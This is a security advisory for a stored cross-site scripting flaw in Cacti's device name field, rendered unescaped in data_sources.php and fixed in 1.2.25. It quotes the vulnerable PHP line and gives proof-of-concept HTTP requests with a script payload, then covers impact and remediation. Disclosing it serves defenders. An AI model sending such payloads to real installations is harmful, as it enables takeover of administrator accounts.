# Cross-Site Scripting vulnerability with Device Name when managing Data Sources

Moderate

[netniV](/netniV)
published
GHSA-vqcc-5v63-g9q7
Sep 5, 2023

## Package

cacti

## Affected versions

<1.2.25

## Patched versions

1.2.25, 1.3.0

## Description

### Summary

A Stored Cross-Site-Scripting Vulnerability allows an authenticated user to poison data stored in the *cacti*'s database. These data will be viewed by administrative *cacti* accounts and execute JavaScript code in the victim's browser at view-time.

### Details

The script under `data_sources.php` displays the data source management information (e.g. data source path, polling configuration, device name related to the datasource etc.) for different data visualizations of the *cacti* app. *CENSUS* found that an adversary that is able to configure a malicious device name, can deploy a stored XSS attack against any user of the same (or broader) privileges.

A user that possesses the *General Administration>Sites/Devices/Data* permissions can configure the device names in *cacti*. This configuration occurs through `http://<HOST>/cacti/host.php`, while the rendered malicious payload is exhibited at `http://<HOST>/cacti/data_sources.php`.

The relevant vulnerable code-block could be found at `data_sources.php:866`

```
<span class='linkMarker'>*</span><a class='hyperLink' href='<?php print html_escape('graphs.php?action=graph_edit&id=' . $id['local_graph_id']);?>'><?php print __('Edit Graph: \'%s\'.', $name);?></a>
```

Notice how the `$name` variable is not escaped, enabling malicious code to be injected in the rendered page.

A Stored XSS attack, aka Stored Cross Site Scripting attack, is manifested when an adversary poisons data that is stored in the backend with malicious JavaScript code. If a site is vulnerable to a stored XSS attack then when the poisoned data get rendered on the victim's browser, the malicious code block will become part of the browser's DOM and with thus be executed at view-time.

### PoC

To verify the issue one can perform a call of the following form, in order to place a malicious payload in the *cacti* database:

```
POST /cacti/host.php?header=false HTTP/1.1
Host: <HOST>
Content-Length: 739
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://{HOST}
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: <COOKIE>
Connection: close

__csrf_magic=<TOKEN>&description=%3Cscript%3Ealert('malicious+code+in+device+name')%3C%2Fscript%3E&hostname=localhost&location=&poller_id=1&site_id=1&host_template_id=1&device_threads=1&snmp_version=2&snmp_community=public&snmp_security_level=authPriv&snmp_auth_protocol=MD5&snmp_username=&snmp_password=&snmp_password_confirm=&snmp_priv_protocol=DES&snmp_priv_passphrase=&snmp_priv_passphrase_confirm=&snmp_context=&snmp_engine_id=&snmp_port=161&snmp_timeout=500&max_oids=10&bulk_walk_size=-1&availability_method=2&ping_method=1&ping_port=23&ping_timeout=400&ping_retries=1&notes=&external_id=&id=4&save_component_host=1&graph_template_id=26&snmp_query_id=5&reindex_method=1&action=save

```

For the attacker to place the malicious payload, the aforementioned *General Administration>Sites/Devices/Data* privileges are required. For the victim to view the malicious information, the same or higher privileges are required.

An example request that renders the malicious data can be found below:

```
GET /cacti/data_sources.php?action=ds_edit&id=39 HTTP/1.1
Host: <HOST>
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: <COOKIE>
Connection: close

```

Following the rendered payload in the response of the request above

```
<tr><td>Total: 0.000000, Delta: 0.000000, Could not find data query XML file at '<script>alert('malicious data query path')</script>'</td></tr>
```
### Impact

To perform the Stored XSS attack the adversary needs to be an authorized cacti user with the following permissions:

* *General Administration>Sites/Devices/Data* in order to create a device or edit an existent device's name

The victim of this attack should have at least the following permissions

* *General Administration>Sites/Devices/Data* to view the `data_sources.php`

Once the attacker has executed the malicious JavaScript within the victim's browser it is possible to

* perform a victim-account takeover
* perform arbitrary actions on the platform as the victim user
* redirect the user to a malicious website
* ask for sensitive information, under the cover of the cacti webpage
* run browser related exploits and attacks
* join a browser botnet and participate in a DDoS attack

### Remediation

Before rendering this user supplied information either make this be a text element in the rendered HTML or escape (by using HTML entities) the content so that the malicious block will not be considered as code in the final HTML output.

> The issue was identified by *Vissarion Moutafis* of *CENSUS*. *CENSUS* will be releasing an advisory for this issue once a release that fixes the issue becomes available (or in 90 days, whichever comes first). Should you require assistance with the review of the patch we will be more than happy to help!

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
